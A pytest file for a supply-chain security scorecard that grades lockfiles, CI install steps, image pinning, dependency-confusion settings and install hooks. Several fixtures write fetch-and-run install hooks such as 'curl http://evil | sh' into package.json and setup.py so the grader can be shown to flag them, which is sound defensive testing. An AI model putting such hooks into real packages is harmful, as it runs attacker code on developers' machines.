"""Tests for the deterministic §7.11 supply-chain scorecard.

Focus: the ecosystem-parametric false-negative bugfixes (F1 GitLab pinning,
F6 uv.lock, F7 Java Gradle locking/verification) from
docs/internal/analysis/analysis-supply-chain-coverage-improvement.md. Before the fix, each of
these scored MISSING despite a *good* posture.
"""

from __future__ import annotations

import assess_supply_chain_controls as asc
import pytest

# --- F6: uv.lock is a valid lockfile -----------------------------------------


def test_uv_lock_credited_as_lockfile(tmp_path):
    (tmp_path / "uv.lock").write_text("# uv lockfile\n", encoding="utf-8")
    result = asc._eval_lockfile("", str(tmp_path))
    assert result["effectiveness"] == asc.ADEQUATE


def test_requirements_lock_credited(tmp_path):
    (tmp_path / "requirements.lock").write_text("flask==3.0.0\n", encoding="utf-8")
    assert asc._eval_lockfile("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


# --- F7: Java Gradle locking / verification ----------------------------------


def test_gradle_lockfile_credited(tmp_path):
    (tmp_path / "gradle.lockfile").write_text("org.foo:bar:1.0\n", encoding="utf-8")
    assert asc._eval_lockfile("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


def test_gradle_verification_metadata_credited(tmp_path):
    gdir = tmp_path / "gradle"
    gdir.mkdir()
    (gdir / "verification-metadata.xml").write_text("<verification-metadata/>", encoding="utf-8")
    assert asc._eval_lockfile("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


def test_gradle_verify_locks_is_deterministic_ci_install():
    recon = "CI runs: ./gradlew build --verify-locks"
    assert asc._eval_ci_install(recon)["effectiveness"] == asc.ADEQUATE


def test_maven_strict_checksums_is_deterministic_ci_install():
    recon = "CI runs: mvn --strict-checksums verify"
    assert asc._eval_ci_install(recon)["effectiveness"] == asc.ADEQUATE


def test_no_lockfile_still_missing(tmp_path):
    assert asc._eval_lockfile("", str(tmp_path))["effectiveness"] == asc.MISSING


# --- F1: GitLab CI image digest-pinning --------------------------------------


def test_gitlab_digest_pinned_image_adequate(tmp_path):
    digest = "a" * 64
    (tmp_path / ".gitlab-ci.yml").write_text(
        f"build:\n  image: node@sha256:{digest}\n  script: [make]\n", encoding="utf-8"
    )
    result = asc._eval_action_pinning("", str(tmp_path))
    assert result["effectiveness"] == asc.ADEQUATE


def test_gitlab_mutable_tag_image_missing(tmp_path):
    (tmp_path / ".gitlab-ci.yml").write_text("build:\n  image: node:18\n  script: [make]\n", encoding="utf-8")
    result = asc._eval_action_pinning("", str(tmp_path))
    assert result["effectiveness"] == asc.MISSING


def test_gitlab_mixed_images_partial(tmp_path):
    digest = "b" * 64
    (tmp_path / ".gitlab-ci.yml").write_text(
        f"a:\n  image: node@sha256:{digest}\nb:\n  image: python:3.12\n", encoding="utf-8"
    )
    result = asc._eval_action_pinning("", str(tmp_path))
    assert result["effectiveness"] == asc.PARTIAL


def test_no_ci_references_missing(tmp_path):
    result = asc._eval_action_pinning("", str(tmp_path))
    assert result["effectiveness"] == asc.MISSING
    assert "GitLab" in result["reason"]


# --- regression: GitHub Actions path still graded ----------------------------


def test_github_sha_pinned_still_adequate(tmp_path):
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    sha = "c" * 40
    (wf / "ci.yml").write_text(f"jobs:\n  b:\n    steps:\n      - uses: actions/checkout@{sha}\n", encoding="utf-8")
    assert asc._eval_action_pinning("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


def test_github_mutable_tag_still_missing(tmp_path):
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text("jobs:\n  b:\n    steps:\n      - uses: actions/checkout@v4\n", encoding="utf-8")
    assert asc._eval_action_pinning("", str(tmp_path))["effectiveness"] == asc.MISSING


# --- _load_recon -------------------------------------------------------------


def test_load_recon_reads_file(tmp_path):
    (tmp_path / ".recon-summary.md").write_text("# Recon\nhello", encoding="utf-8")
    assert "hello" in asc._load_recon(str(tmp_path), None)


def test_load_recon_missing_returns_empty(tmp_path):
    assert asc._load_recon(str(tmp_path), str(tmp_path)) == ""


# --- _has --------------------------------------------------------------------
#
# ``_section`` was removed: it was never called, and its heading pattern was
# built with an f-string ``#{1, 4}`` that Python evaluated as the tuple
# ``(1, 4)`` rather than a regex quantifier, so it could never match a real
# markdown heading. The two tests that pinned that degenerate behaviour went
# with it.


def test_has_matches_case_insensitive():
    assert asc._has("NPM CI here", r"npm\s+ci\b") is True
    assert asc._has("nothing", r"zzz") is False


# --- _eval_lockfile recon-text path + GitHub-via-recon -----------------------


def test_lockfile_detected_in_recon_text():
    assert asc._eval_lockfile("we have a Cargo.lock committed", None)["effectiveness"] == asc.ADEQUATE


# --- _eval_ci_install --------------------------------------------------------


def test_ci_install_mutable_npm_install_missing():
    res = asc._eval_ci_install("step runs npm install in CI")
    assert res["effectiveness"] == asc.MISSING
    assert "mutable" in res["reason"]


def test_ci_install_none_detected_missing():
    res = asc._eval_ci_install("no install commands anywhere")
    assert res["effectiveness"] == asc.MISSING
    assert "No CI install step" in res["reason"]


def test_ci_install_npm_ci_adequate():
    assert asc._eval_ci_install("run: npm ci")["effectiveness"] == asc.ADEQUATE


# --- _eval_action_pinning via recon (no repo root) ---------------------------


def test_action_pinning_github_via_recon_partial():
    sha = "d" * 40
    recon = f"uses: actions/checkout@{sha}\nuses: foo/bar@v3\n"
    assert asc._eval_action_pinning(recon, None)["effectiveness"] == asc.PARTIAL


def test_action_pinning_reads_yaml_workflow_files(tmp_path):
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    sha = "e" * 40
    (wf / "ci.yaml").write_text(f"steps:\n  - uses: actions/checkout@{sha}\n", encoding="utf-8")
    assert asc._eval_action_pinning("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


# --- _eval_container_hygiene -------------------------------------------------


def test_container_no_dockerfile_missing():
    assert asc._eval_container_hygiene("no docker here", None)["effectiveness"] == asc.MISSING


def test_container_digest_pinned_adequate(tmp_path):
    digest = "f" * 64
    (tmp_path / "Dockerfile").write_text(f"FROM node@sha256:{digest}\n", encoding="utf-8")
    assert asc._eval_container_hygiene("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


def test_container_version_tag_partial(tmp_path):
    (tmp_path / "Dockerfile").write_text("FROM node:18\n", encoding="utf-8")
    assert asc._eval_container_hygiene("", str(tmp_path))["effectiveness"] == asc.PARTIAL


def test_container_latest_missing(tmp_path):
    (tmp_path / "Dockerfile").write_text("FROM node:latest\n", encoding="utf-8")
    assert asc._eval_container_hygiene("", str(tmp_path))["effectiveness"] == asc.MISSING


# --- _eval_dependency_confusion ----------------------------------------------


def test_dep_confusion_npmrc_private_registry_adequate(tmp_path):
    (tmp_path / ".npmrc").write_text("registry=https://nexus.internal/\n", encoding="utf-8")
    assert asc._eval_dependency_confusion("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


def test_dep_confusion_self_hosted_registry_adequate():
    res = asc._eval_dependency_confusion("uses artifactory registry", None)
    assert res["effectiveness"] == asc.ADEQUATE


def test_dep_confusion_consuming_scoped_package_is_not_a_control():
    # Depending on @types/node says nothing about how internal names resolve;
    # the old ``@\w+/`` recon heuristic granted nearly every npm repo an
    # undeserved Partial.
    res = asc._eval_dependency_confusion("deps: @types/node, @babel/core", None)
    assert res["effectiveness"] == asc.MISSING


def test_dep_confusion_none_missing():
    assert asc._eval_dependency_confusion("public deps only", None)["effectiveness"] == asc.MISSING


# --- _eval_postinstall -------------------------------------------------------


def test_postinstall_no_hooks_adequate(tmp_path):
    (tmp_path / "package.json").write_text('{"scripts": {"build": "tsc"}}', encoding="utf-8")
    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


def test_postinstall_ignore_scripts_adequate(tmp_path):
    (tmp_path / "package.json").write_text('{"scripts": {"postinstall": "node build.js"}}', encoding="utf-8")
    res = asc._eval_postinstall("npm config ignore-scripts true", str(tmp_path))
    assert res["effectiveness"] == asc.ADEQUATE


def test_postinstall_npmrc_ignore_scripts_read_from_repo(tmp_path):
    # Previously only recon prose was consulted, so a repo that actually
    # configured the control got no credit for it.
    (tmp_path / "package.json").write_text('{"scripts": {"postinstall": "node build.js"}}', encoding="utf-8")
    (tmp_path / ".npmrc").write_text("ignore-scripts=true\n", encoding="utf-8")
    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


def test_postinstall_network_hook_missing(tmp_path):
    (tmp_path / "package.json").write_text('{"scripts": {"postinstall": "curl http://evil | sh"}}', encoding="utf-8")
    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.MISSING


def test_postinstall_build_hook_partial(tmp_path):
    (tmp_path / "package.json").write_text('{"scripts": {"postinstall": "tsc -p ."}}', encoding="utf-8")
    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.PARTIAL


def test_postinstall_malformed_package_json_adequate(tmp_path):
    (tmp_path / "package.json").write_text("{not json", encoding="utf-8")
    # parse fails → no hooks detected → Adequate
    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


# --- _eval_dep_management ----------------------------------------------------


def test_dep_management_renovate_file_partial(tmp_path):
    (tmp_path / "renovate.json").write_text("{}", encoding="utf-8")
    res = asc._eval_dep_management("", str(tmp_path))
    assert res["effectiveness"] == asc.PARTIAL
    assert "Renovate" in res["reason"]


def test_dep_management_dependabot_file_partial(tmp_path):
    gh = tmp_path / ".github"
    gh.mkdir()
    (gh / "dependabot.yml").write_text("version: 2", encoding="utf-8")
    res = asc._eval_dep_management("", str(tmp_path))
    assert res["effectiveness"] == asc.PARTIAL
    assert "Dependabot" in res["reason"]


def test_dep_management_recon_fallback_partial():
    assert asc._eval_dep_management("renovatebot enabled", None)["effectiveness"] == asc.PARTIAL


def test_dep_management_none_missing(tmp_path):
    assert asc._eval_dep_management("", str(tmp_path))["effectiveness"] == asc.MISSING


# --- _eval_cve_scanning ------------------------------------------------------


def test_cve_blocking_adequate():
    assert asc._eval_cve_scanning("trivy image --exit-code 1")["effectiveness"] == asc.ADEQUATE


def test_cve_fail_closed_by_default_is_adequate():
    # npm audit / pip-audit / osv-scanner / snyk test all exit non-zero on
    # findings without any threshold flag; requiring one under-graded a
    # correctly blocking pipeline.
    assert asc._eval_cve_scanning("runs npm audit")["effectiveness"] == asc.ADEQUATE
    assert asc._eval_cve_scanning("run: pip-audit")["effectiveness"] == asc.ADEQUATE


def test_cve_advisory_partial():
    # trivy defaults to exit code 0, so without --exit-code it really is advisory.
    assert asc._eval_cve_scanning("trivy image myapp")["effectiveness"] == asc.PARTIAL


def test_cve_suppressed_exit_code_is_weak():
    assert asc._eval_cve_scanning("run: npm audit --audit-level=high || true")["effectiveness"] == asc.WEAK


def test_cve_continue_on_error_is_weak():
    wf = "steps:\n  - name: audit\n    run: pip-audit\n    continue-on-error: true\n"
    assert asc._eval_cve_scanning(wf)["effectiveness"] == asc.WEAK


def test_cve_none_missing():
    assert asc._eval_cve_scanning("nothing")["effectiveness"] == asc.MISSING


# --- _eval_sca_tooling -------------------------------------------------------


def test_sca_dedicated_adequate():
    assert asc._eval_sca_tooling("we run snyk test")["effectiveness"] == asc.ADEQUATE


def test_sca_native_only_partial():
    assert asc._eval_sca_tooling("only npm audit")["effectiveness"] == asc.PARTIAL


def test_sca_none_missing():
    assert asc._eval_sca_tooling("nothing")["effectiveness"] == asc.MISSING


# --- _derive_overall ---------------------------------------------------------


def test_derive_overall_any_missing_caps_weak():
    subs = [
        {"name": "A", "effectiveness": asc.ADEQUATE},
        {"name": "B", "effectiveness": asc.MISSING},
        {"name": "C", "effectiveness": asc.PARTIAL},
    ]
    worst, reason = asc._derive_overall(subs)
    assert worst == asc.WEAK
    assert "Missing controls: B" in reason
    assert "Partial: C" in reason


def test_derive_overall_all_adequate():
    subs = [{"name": "A", "effectiveness": asc.ADEQUATE}, {"name": "B", "effectiveness": asc.ADEQUATE}]
    worst, reason = asc._derive_overall(subs)
    assert worst == asc.ADEQUATE
    assert "All supply chain sub-controls rated Adequate" in reason


def test_derive_overall_partial_only():
    subs = [{"name": "A", "effectiveness": asc.PARTIAL}, {"name": "B", "effectiveness": asc.ADEQUATE}]
    worst, reason = asc._derive_overall(subs)
    assert worst == asc.PARTIAL
    assert "Partial: A" in reason


def test_derive_overall_weak_row_caps_domain_at_weak():
    subs = [
        {"name": "A", "effectiveness": asc.ADEQUATE},
        {"name": "B", "effectiveness": asc.WEAK},
    ]
    worst, reason = asc._derive_overall(subs)
    assert worst == asc.WEAK
    assert "Weak: B" in reason


# --- assess() ----------------------------------------------------------------


def test_assess_returns_nine_sub_controls(tmp_path):
    result = asc.assess(str(tmp_path), str(tmp_path))
    assert result["schema_version"] == 1
    assert len(result["sub_controls"]) == 9
    assert result["overall_effectiveness"] in (asc.ADEQUATE, asc.PARTIAL, asc.WEAK, asc.MISSING)
    assert result["source"] == "deterministic:assess_supply_chain_controls.py"


# --- main() via subprocess ---------------------------------------------------


def test_main_writes_file(run_plugin_script, tmp_path):
    res = run_plugin_script("assess_supply_chain_controls.py", str(tmp_path), check=False)
    assert res.returncode == 0
    out = tmp_path / ".supply-chain-assessment.json"
    assert out.exists()
    import json as _json

    data = _json.loads(out.read_text(encoding="utf-8"))
    assert len(data["sub_controls"]) == 9


def test_main_report_only_prints(run_plugin_script, tmp_path):
    res = run_plugin_script("assess_supply_chain_controls.py", str(tmp_path), "--report-only", check=False)
    assert res.returncode == 0
    assert '"sub_controls"' in res.stdout
    assert not (tmp_path / ".supply-chain-assessment.json").exists()


# --- Python & npm grading fixes (2026-07-19) ---------------------------------
#
# Regression tests for the gaps catalogued in
# docs/analysis/analysis-supply-chain-python-npm-gaps-2026-07-19.md. Each test
# names the finding it pins so the intent survives a future refactor.


# S2 — controls that used to grade on recon text alone now read the CI files.
def test_ci_install_read_from_workflow_when_recon_empty(tmp_path):
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text("jobs:\n  b:\n    steps:\n      - run: npm ci\n", encoding="utf-8")
    assert asc._eval_ci_install("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


def test_cve_scanning_read_from_workflow_when_recon_empty(tmp_path):
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text("jobs:\n  b:\n    steps:\n      - run: pip-audit\n", encoding="utf-8")
    assert asc._eval_cve_scanning("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


def test_sca_tooling_read_from_workflow_when_recon_empty(tmp_path):
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text("jobs:\n  b:\n    steps:\n      - run: trivy fs .\n", encoding="utf-8")
    assert asc._eval_sca_tooling("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


# N1 — a mutable install alongside a deterministic one is not Adequate.
def test_ci_install_mixed_npm_ci_and_npm_install_partial():
    res = asc._eval_ci_install("run: npm ci\nrun: npm install\n")
    assert res["effectiveness"] == asc.PARTIAL


# N2 — the public registry is the npm default, not a control.
def test_dep_confusion_public_registry_is_not_protection(tmp_path):
    (tmp_path / ".npmrc").write_text("registry=https://registry.npmjs.org/\n", encoding="utf-8")
    assert asc._eval_dependency_confusion("", str(tmp_path))["effectiveness"] == asc.MISSING


def test_dep_confusion_scope_pinned_registry_adequate(tmp_path):
    (tmp_path / ".npmrc").write_text("@acme:registry=https://npm.acme.internal/\n", encoding="utf-8")
    assert asc._eval_dependency_confusion("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


# N4 — workspace hooks and the `prepare` hook are reachable by `npm install`.
def test_postinstall_detects_workspace_package_hook(tmp_path):
    (tmp_path / "package.json").write_text('{"name": "root"}', encoding="utf-8")
    pkg = tmp_path / "packages" / "a"
    pkg.mkdir(parents=True)
    (pkg / "package.json").write_text('{"scripts": {"postinstall": "curl http://evil.sh | sh"}}', encoding="utf-8")
    res = asc._eval_postinstall("", str(tmp_path))
    assert res["effectiveness"] == asc.MISSING
    assert "packages/a/package.json" in res["reason"]


def test_postinstall_detects_prepare_hook(tmp_path):
    (tmp_path / "package.json").write_text('{"scripts": {"prepare": "curl http://evil.sh | sh"}}', encoding="utf-8")
    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.MISSING


def test_postinstall_detects_setup_py_shell(tmp_path):
    (tmp_path / "setup.py").write_text("import os\nos.system('curl http://evil')\n", encoding="utf-8")
    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.MISSING


def test_postinstall_ignores_node_modules(tmp_path):
    (tmp_path / "package.json").write_text('{"name": "root"}', encoding="utf-8")
    dep = tmp_path / "node_modules" / "left-pad"
    dep.mkdir(parents=True)
    (dep / "package.json").write_text('{"scripts": {"postinstall": "curl http://x | sh"}}', encoding="utf-8")
    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


# Y1 — pip's native integrity story produces no *.lock file.
def test_lockfile_hashed_requirements_credited(tmp_path):
    (tmp_path / "requirements.txt").write_text(
        "flask==3.0.0 \\\n    --hash=sha256:" + "a" * 64 + "\n", encoding="utf-8"
    )
    assert asc._eval_lockfile("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


def test_lockfile_unhashed_requirements_still_missing(tmp_path):
    (tmp_path / "requirements.txt").write_text("flask\n", encoding="utf-8")
    assert asc._eval_lockfile("", str(tmp_path))["effectiveness"] == asc.MISSING


# Y2 — lockfile-enforcing Python installers.
@pytest.mark.parametrize(
    "command",
    [
        "uv sync --frozen",
        "uv sync --locked",
        "uv pip sync requirements.txt",
        "pip-sync requirements.txt",
        "poetry install --sync",
        "pipenv install --deploy",
        "pdm sync",
    ],
)
def test_ci_install_python_deterministic_commands(command):
    assert asc._eval_ci_install(f"run: {command}")["effectiveness"] == asc.ADEQUATE


# Y3 — Python dependency-confusion exposure.
def test_dep_confusion_extra_index_url_is_weak():
    res = asc._eval_dependency_confusion("run: pip install --extra-index-url https://internal/ pkg", None)
    assert res["effectiveness"] == asc.WEAK


def test_dep_confusion_uv_unsafe_index_strategy_is_weak(tmp_path):
    (tmp_path / "pyproject.toml").write_text('[tool.uv]\nindex-strategy = "unsafe-best-match"\n', encoding="utf-8")
    assert asc._eval_dependency_confusion("", str(tmp_path))["effectiveness"] == asc.WEAK


# S1 — Adequate is reachable for the domain again.
def test_dep_management_full_coverage_with_cooldown_adequate(tmp_path):
    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
    gh = tmp_path / ".github"
    gh.mkdir()
    (gh / "dependabot.yml").write_text(
        'version: 2\nupdates:\n  - package-ecosystem: "npm"\n    cooldown:\n      default-days: 7\n',
        encoding="utf-8",
    )
    assert asc._eval_dep_management("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


def test_dep_management_uncovered_ecosystem_partial(tmp_path):
    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
    (tmp_path / "pyproject.toml").write_text("[project]\n", encoding="utf-8")
    gh = tmp_path / ".github"
    gh.mkdir()
    (gh / "dependabot.yml").write_text('version: 2\nupdates:\n  - package-ecosystem: "npm"\n', encoding="utf-8")
    res = asc._eval_dep_management("", str(tmp_path))
    assert res["effectiveness"] == asc.PARTIAL
    assert "pip" in res["reason"]


def test_dep_management_no_cooldown_partial(tmp_path):
    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
    gh = tmp_path / ".github"
    gh.mkdir()
    (gh / "dependabot.yml").write_text('version: 2\nupdates:\n  - package-ecosystem: "npm"\n', encoding="utf-8")
    res = asc._eval_dep_management("", str(tmp_path))
    assert res["effectiveness"] == asc.PARTIAL
    assert "cooldown" in res["reason"]


# C1 — every FROM in every Dockerfile is graded.
def test_container_multistage_mixed_pinning_partial(tmp_path):
    (tmp_path / "Dockerfile").write_text(
        "FROM python:3.12@sha256:" + "b" * 64 + " AS build\nFROM node:latest\n", encoding="utf-8"
    )
    assert asc._eval_container_hygiene("", str(tmp_path))["effectiveness"] == asc.PARTIAL


def test_container_non_root_dockerfile_detected(tmp_path):
    (tmp_path / "Dockerfile.prod").write_text("FROM node:latest\n", encoding="utf-8")
    assert asc._eval_container_hygiene("", str(tmp_path))["effectiveness"] == asc.MISSING


def test_container_stage_alias_not_penalised(tmp_path):
    (tmp_path / "Dockerfile").write_text(
        "FROM python:3.12@sha256:" + "b" * 64 + " AS build\nFROM build\n", encoding="utf-8"
    )
    assert asc._eval_container_hygiene("", str(tmp_path))["effectiveness"] == asc.ADEQUATE
